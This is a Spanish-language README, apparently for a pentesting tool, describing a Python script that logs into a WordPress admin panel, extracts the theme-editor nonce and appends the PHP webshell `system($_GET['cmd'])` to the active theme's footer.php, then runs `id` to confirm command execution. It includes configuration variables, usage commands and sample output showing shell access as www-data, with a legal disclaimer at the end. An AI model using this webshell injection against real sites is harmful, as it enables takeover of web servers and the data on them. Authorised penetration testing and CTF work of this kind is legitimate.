# WordPress RCE - Inyeccion de Webshell via Editor de Temas

## Descripcion

Desarrolle este script en Python para automatizar la explotacion de una vulnerabilidad de ejecucion remota de comandos (RCE) en WordPress a traves del editor de temas integrado. El script se autentica en el panel de administracion, extrae el nonce de seguridad y modifica el archivo `footer.php` del tema activo para inyectar una webshell PHP.

## Como funciona

1. **Autenticacion**: El script inicia sesion en WordPress con credenciales validas
2. **Extraccion de nonce**: Obtiene el token CSRF del editor de temas (soporta formato numerico y hexadecimal)
3. **Inyeccion de webshell**: Modifica `footer.php` agregando `<?php system($_GET['cmd']); ?>` al final
4. **Verificacion**: Ejecuta `id` como prueba para confirmar que la webshell funciona

## Requisitos

```bash
pip install requests
```

## Uso

Antes de ejecutar, edita las variables al inicio del script:

```python
TARGET = "https://TARGET_HOST"
USERNAME = "USERNAME"
PASSWORD = "PASSWORD"
THEME = "theme-name"
```

```bash
python3 wordpress-rce-theme-editor-webshell-injection.py
```

## Ejemplo de salida

```
[login] 200
[+] nonce: 8a3f2b1c
[save] 200
[+] guardado correctamente
[webshell test] uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Escenario de ataque

Este script es util cuando ya tenes credenciales de un usuario de WordPress con permisos de edicion de temas. En vez de modificar el archivo manualmente desde el panel, automatiza todo el proceso. Lo use en un entorno de pruebas de penetracion autorizado donde las credenciales fueron obtenidas previamente.

## Consideraciones

- Requiere credenciales validas con acceso al editor de temas
- Si el tema no permite edicion desde el panel (definido en `wp-config.php` con `DISALLOW_FILE_EDIT`), el exploit falla
- La webshell queda expuesta en cada pagina que cargue el footer — es ruidosa, ideal para CTF o pentesting, no para red team sigiloso

## Aviso legal

Este script es unicamente para pruebas de seguridad autorizadas y fines educativos. Siempre obtene la autorizacion correspondiente antes de testear contra cualquier sistema.

## Autor

**Alan Newberry**
